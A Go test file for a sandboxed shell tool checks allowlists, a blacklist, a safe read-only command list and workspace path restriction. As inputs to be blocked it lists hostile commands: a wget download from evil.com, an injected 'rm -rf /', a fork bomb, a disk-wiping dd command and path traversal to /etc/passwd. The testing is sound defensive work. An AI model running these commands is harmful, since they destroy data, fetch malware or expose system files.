package tools

import (
	"context"
	"strings"
	"testing"
)

func TestShellToolAllowlistEnforcement(t *testing.T) {
	tool := NewExecTool("/tmp", false)

	// Configure allowlist with only safe commands
	err := tool.SetSafeCommandsForUser([]string{"ls", "cat", "echo"})
	if err != nil {
		t.Fatalf("Failed to set allowlist: %v", err)
	}

	tests := []struct {
		name       string
		command    string
		shouldFail bool
		reason     string
	}{
		{
			name:       "Allowed: ls command",
			command:    "ls -la",
			shouldFail: false,
		},
		{
			name:       "Allowed: cat command",
			command:    "cat file.txt",
			shouldFail: false,
		},
		{
			name:       "Allowed: echo command",
			command:    "echo hello world",
			shouldFail: false,
		},
		{
			name:       "Blocked: rm command not in allowlist",
			command:    "rm file.txt",
			shouldFail: true,
			reason:     "not in allowlist",
		},
		{
			name:       "Blocked: wget command not in allowlist",
			command:    "wget https://evil.com/malware",
			shouldFail: true,
			reason:     "not in allowlist",
		},
		{
			name:       "Blocked: python command not in allowlist",
			command:    "python script.py",
			shouldFail: true,
			reason:     "not in allowlist",
		},
		{
			name:       "Blocked: command injection attempt",
			command:    "ls; rm -rf /",
			shouldFail: true,
			reason:     "not in allowlist",
		},
	}

	ctx := context.Background()
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := tool.Execute(ctx, map[string]interface{}{
				"command": tt.command,
			})

			if tt.shouldFail {
				// Should return error message instead of actual error
				if err != nil {
					t.Errorf("Expected error message in result, got actual error: %v", err)
				}
				if !strings.Contains(result, "blocked") && !strings.Contains(result, "not in allowlist") {
					t.Errorf("Expected 'blocked' or 'not in allowlist' in result, got: %s", result)
				}
			} else {
				// Should execute successfully (or fail for actual execution reasons, not allowlist)
				if strings.Contains(result, "not in allowlist") {
					t.Errorf("Command should be allowed but was blocked: %s", result)
				}
			}
		})
	}
}

func TestShellToolAdminBypass(t *testing.T) {
	tool := NewExecTool("/tmp", false)

	// No allowlist set - admin mode (only blacklist applies)
	ctx := context.Background()

	tests := []struct {
		name       string
		command    string
		shouldPass bool
	}{
		{
			name:       "Admin can execute ls",
			command:    "ls",
			shouldPass: true,
		},
		{
			name:       "Admin can execute cat",
			command:    "cat /etc/hosts",
			shouldPass: true,
		},
		{
			name:       "Admin can execute grep",
			command:    "grep pattern file.txt",
			shouldPass: true,
		},
		{
			name:       "Admin CANNOT execute rm -rf (blacklist)",
			command:    "rm -rf /",
			shouldPass: false,
		},
		{
			name:       "Admin CANNOT execute shutdown (blacklist)",
			command:    "shutdown now",
			shouldPass: false,
		},
		{
			name:       "Admin CANNOT execute fork bomb (blacklist)",
			command:    ":(){ :|:& };:",
			shouldPass: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, _ := tool.Execute(ctx, map[string]interface{}{
				"command": tt.command,
			})

			isBlocked := strings.Contains(result, "blocked by safety guard")

			if tt.shouldPass && isBlocked {
				t.Errorf("Command should be allowed but was blocked: %s", result)
			}

			if !tt.shouldPass && !isBlocked {
				t.Errorf("Command should be blocked but was allowed: %s", result)
			}
		})
	}
}

func TestShellToolBlacklistAlwaysActive(t *testing.T) {
	tool := NewExecTool("/tmp", false)

	// Set allowlist but verify blacklist is still enforced
	err := tool.SetSafeCommandsForUser(SafeShellCommands)
	if err != nil {
		t.Fatalf("Failed to set allowlist: %v", err)
	}

	ctx := context.Background()

	dangerousCommands := []string{
		"rm -rf /tmp",
		"format c:",
		"dd if=/dev/zero of=/dev/sda",
		"shutdown -h now",
		"reboot",
		":(){ :|:& };:",
	}

	for _, cmd := range dangerousCommands {
		t.Run("Blacklist blocks: "+cmd, func(t *testing.T) {
			result, _ := tool.Execute(ctx, map[string]interface{}{
				"command": cmd,
			})

			if !strings.Contains(result, "blocked by safety guard") {
				t.Errorf("Dangerous command should be blocked by blacklist: %s\nGot result: %s", cmd, result)
			}
		})
	}
}

func TestSafeShellCommandsList(t *testing.T) {
	// Verify SafeShellCommands contains only read-only commands
	readOnlyCommands := map[string]bool{
		"ls":      true,
		"dir":     true,
		"cat":     true,
		"type":    true,
		"head":    true,
		"tail":    true,
		"grep":    true,
		"findstr": true,
		"find":    true,
		"where":   true,
		"pwd":     true,
		"cd":      true,
		"echo":    true,
		"date":    true,
		"whoami":  true,
		"which":   true,
		"wc":      true,
		"sort":    true,
		"uniq":    true,
		"diff":    true,
		"tree":    true,
		"file":    true,
		"stat":    true,
	}

	// Verify all commands in SafeShellCommands are expected
	for _, cmd := range SafeShellCommands {
		if !readOnlyCommands[cmd] {
			t.Errorf("Unexpected command in SafeShellCommands: %s", cmd)
		}
	}

	// Verify minimum set is present
	requiredCommands := []string{"ls", "cat", "grep", "find", "pwd"}
	for _, required := range requiredCommands {
		found := false
		for _, cmd := range SafeShellCommands {
			if cmd == required {
				found = true
				break
			}
		}
		if !found {
			t.Errorf("Required safe command missing: %s", required)
		}
	}
}

func TestShellToolWorkspaceRestriction(t *testing.T) {
	tool := NewExecTool("/tmp/workspace", true) // restrict=true

	ctx := context.Background()

	tests := []struct {
		name            string
		command         string
		shouldBeBlocked bool
	}{
		{
			name:            "Path traversal blocked",
			command:         "cat ../../../etc/passwd",
			shouldBeBlocked: true,
		},
		{
			name:            "Absolute path outside workspace blocked",
			command:         "cat /etc/passwd",
			shouldBeBlocked: true,
		},
		{
			name:            "Relative path inside workspace allowed",
			command:         "cat file.txt",
			shouldBeBlocked: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, _ := tool.Execute(ctx, map[string]interface{}{
				"command": tt.command,
			})

			isBlocked := strings.Contains(result, "path traversal") ||
				strings.Contains(result, "outside working dir")

			if tt.shouldBeBlocked && !isBlocked {
				t.Errorf("Command accessing outside workspace should be blocked: %s", tt.command)
			}

			if !tt.shouldBeBlocked && isBlocked {
				t.Errorf("Command inside workspace should not be blocked: %s", tt.command)
			}
		})
	}
}
